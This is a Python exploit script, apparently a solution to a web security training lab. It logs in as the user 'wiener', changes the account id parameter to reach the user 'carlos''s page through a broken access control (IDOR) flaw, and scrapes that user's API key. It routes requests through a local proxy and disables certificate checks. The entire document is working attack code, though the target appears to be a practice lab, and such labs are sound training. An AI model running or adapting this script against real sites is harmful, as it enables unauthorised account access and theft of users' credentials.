import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def carlos_api_key(s, url):

    # Get CSRF token from login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    #Login as user
    print("[+] Logging in as user...")
    data_login = {"csrf": csrf_token, "username": "wiener", "password": 'peter'}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("[+] Successfully logged in as a user!")
        
        # Exploit access control vulnerability and access the carlos account
        carlos_url = url + "/my-account?id=carlos"
        r = s.get(carlos_url, verify=False, proxies=proxies)
        res = r.text
        if "carlos" in res:
            print("[+] Successfully logged into target account!")
            print("[+] Retrieving API key...")
            api_key = re.search("Your API Key is:(.*)", res).group(1)
            print("[+] API key is: " + api_key.split('</div>')[0])
        else:
            print("[-] Could not access target account.")
            sys.exit(-1)



    else:
        print("[-] could not login as a user.")
        sys.exit(-1)



def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    print("Logging in as user...")
    carlos_api_key(s, url)

if __name__ == "__main__":
    main() 